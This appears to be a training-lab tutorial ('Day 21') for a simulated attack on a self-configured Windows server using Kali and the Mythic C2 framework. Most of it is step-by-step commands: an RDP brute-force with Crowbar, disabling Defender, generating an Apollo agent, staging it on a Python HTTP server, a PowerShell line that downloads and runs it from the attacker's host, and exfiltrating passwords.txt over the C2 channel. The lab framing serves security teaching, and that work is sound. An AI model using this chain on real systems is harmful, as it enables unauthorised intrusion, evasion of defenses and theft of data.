**DAY 21: Mythic Agent Setup Tutorial**  
*This guide details the practical steps for simulating an attack: performing an RDP brute-force, generating a Mythic agent, establishing a C2 session, and exfiltrating data.*  

---

### 1. Target Preparation (Windows Server)  
**Create Decoy File:**  
- Log into the Windows server.  
- Navigate to the Documents folder.  
- Create a new text file named `passwords.txt`.  
- Add sample content to the file (e.g., `winter2024!`).  

**Modify Password Policy (To Simulate a Weak Environment):**  
- Open `Edit Group Policy` from the Start Menu.  
- Navigate:  
  `Windows Settings → Security Settings → Account Policies → Password Policy`.  
- Change `Minimum password length` to a low number (e.g., `5`).  
- Set `Password must meet complexity requirements` to `Disabled`.  

**Set Target Password:**  
- Go to `Change account settings → Sign-in options → Password`.  
- Change the administrator password to the weak password (e.g., `winter2024!`).  

---

### 2. Attacker Preparation (Kali Linux)  
**Create Custom Wordlist:**  
- Default wordlists are in `/usr/share/wordlists/`.  
- Unzip a common list:  
  ```bash
  sudo gunzip rockyou.txt.gz
  ```  
- Create a smaller, custom wordlist for the attack:  
  ```bash
  head -n 50 rockyou.txt > your-own-wordlist.txt
  ```  
- Add the known target password to this new list:  
  ```bash
  nano your-own-wordlist.txt
  ```  
  Add `winter2024!` to the file and save it.  

**Install Brute-Force Tool (Crowbar):**  
- Update repositories:  
  ```bash
  sudo apt-get update && sudo apt-get upgrade -y
  ```  
- Install Crowbar:  
  ```bash
  sudo apt-get install -y crowbar
  ```  

---

### 3. Phase 1: Initial Access (RDP Brute-Force)  
**Run Crowbar:**  
Use this command to brute-force the RDP service:  
```bash
crowbar -b rdp -U administrator -C /path/to/your-own-wordlist.txt -s <TARGET_IP>/32
```  

**Review Output:**  
Crowbar will test passwords and show a `SUCCESS` message with the correct credentials.  

---

### 4. Phase 2: Execution & Discovery  
**Connect via RDP:**  
- Use `xfreeRDP` with found credentials:  
  ```bash
  xfreeRDP /u:administrator /p:winter2024! /v:<TARGET_IP>:3389
  ```  
- Accept the certificate prompt.  

**Run Discovery Commands (in `cmd.exe`):**  
- `whoami`  
- `ipconfig`  
- `net user`  
- `net user administrator` (check group memberships)  

**Defense Evasion (Disable Defender):**  
- Open `Windows Security` from Start Menu.  
- Navigate:  
  `Virus & threat protection settings → Manage settings`.  
- Toggle `Real-time protection` to **Off**.  
- Toggle `Cloud-delivered protection` and `Automatic sample submission` to **Off**.  

---

### 5. Phase 3: Install Mythic Agent & C2 Profile  
**Connect to Mythic Server (via SSH):**  
Log into your Mythic server terminal.  

**Install Agent (Apollo):**  
```bash
./mythic-cli install github https://github.com/MythicAgents/apollo
```  

**Install C2 Profile (HTTP):**  
```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```  

**Verify Installation:**  
- Go to Mythic Web UI → `Payloads / C2 Services` (headset icon).  
- Confirm `apollo` and `http` are active.  

---

### 6. Phase 4: Generate & Stage Payload  
**Generate Payload (Mythic UI):**  
1. Go to `Payloads` (biohazard icon) → `Actions` → `Generate new payload`.  
2. **Step 1:** Select `Windows` OS.  
3. **Step 2:** Choose `Windows Executable` and `apollo` agent.  
4. **Step 3:** Include all commands.  
5. **Step 4 (Configure C2):**  
   - Select `http` profile.  
   - **Callback Host:** Change `https://` to `http://` + Mythic Server's Public IP.  
   - **Callback Port:** Change to `80`.  
6. **Step 5 (Finalize):**  
   - **Payload Name:** `servicehost-your-own-handle.exe`  
   - **Description:** Add custom description.  
   - Click `Create payload`.  

**Download Payload to Mythic Server:**  
- Copy the download link from UI.  
- In Mythic server's SSH session:  
  ```bash
  wget --no-check-certificate "PASTE_THE_COPIED_LINK_HERE"
  mv <downloaded_file> servicehost-your-own-handle.exe
  ```  

**Stage Payload for Download:**  
```bash
mkdir one
mv servicehost-your-own-handle.exe one/
cd one
python3 -m http.server 9999
```  

**Firewall Rule (Mythic Server):**  
```bash
ufw allow 9999
```  

---

### 7. Phase 5: Deploy Payload & Establish C2  
**Download Payload on Target (Windows Server):**  
In RDP session's command prompt:  
```powershell
powershell -c "invoke-webrequest -uri http://<MYTHIC_IP>:9999/servicehost-your-own-handle.exe -outfile C:\Users\Public\Downloads\servicehost-your-own-handle.exe"
```  

**Execute Payload (Windows Server):**  
```cmd
cd C:\Users\Public\Downloads
.\servicehost-your-own-handle.exe
```  

**Firewall Rule (Mythic Server):**  
```bash
ufw allow 80
```  

**Confirm Callback (Mythic UI):**  
- New callback appears in `Active Callbacks` (telephone icon).  
- Click `Interact` (keyboard icon).  

---

### 8. Phase 6: Action on Objectives (Exfiltration)  
**Interact with Agent:**  
- In `Interact` tab, run:  
  ```bash
  whoami
  ifconfig
  ```  

**Exfiltrate File:**  
```bash
download C:\Users\administrator\Documents\passwords.txt
```  

**Verify Exfiltration (Mythic UI):**  
- Wait for task completion (green status).  
- Go to `File Browser` (paperclip icon).  
- View `passwords.txt` to confirm exfiltration.
